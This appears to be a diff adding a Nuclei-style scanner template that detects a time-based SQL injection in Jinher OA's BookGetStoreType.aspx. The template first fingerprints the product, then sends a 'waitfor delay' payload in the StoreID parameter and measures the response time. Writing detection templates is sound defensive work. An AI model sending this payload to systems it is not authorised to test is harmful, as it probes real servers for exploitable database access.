@@ -1,0 +1,48 @@
+id: poc-yaml-jinher-jhsoft-bookgetstoretype-aspx-sqli
+info:
+  name: Jinher OA BookGetStoreType.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    description: |
+      Jinher OA BookGetStoreType.aspx contains an SQL injection vulnerability that can be exploited by attackers to manipulate database queries.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "JHSoft"
+        part: body
+
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.Books/BookGetStoreType.aspx?StoreID=1'waitfor+delay%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "ASP.NET_SessionId="
+        part: header
+      - type: word
+        words:
+          - ""
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
